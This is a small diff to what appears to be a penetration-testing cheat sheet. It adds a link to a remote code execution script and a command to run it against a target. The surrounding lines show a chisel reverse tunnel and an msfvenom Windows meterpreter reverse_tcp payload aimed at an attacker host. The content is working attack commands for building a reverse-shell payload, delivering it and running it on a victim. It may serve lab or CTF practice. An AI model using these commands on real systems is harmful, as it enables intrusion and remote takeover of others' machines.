@@ -115,8 +115,7 @@ client:
 \chisel.exe client 10.10.10.11:1234 R:9512:127.0.0.1:9512
 ==========(12)======================================================================================================================
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe -o payload.exe
+https://raw.githubusercontent.com/ajiththomas/python/refs/heads/main/unifiedRemoteCodeExecution.py
 
-
-
-
-
+python3 unifiedRemoteCodeExecution.py <target-ip> <local-http-ip> payload.exe
+==========()======================================================================================================================
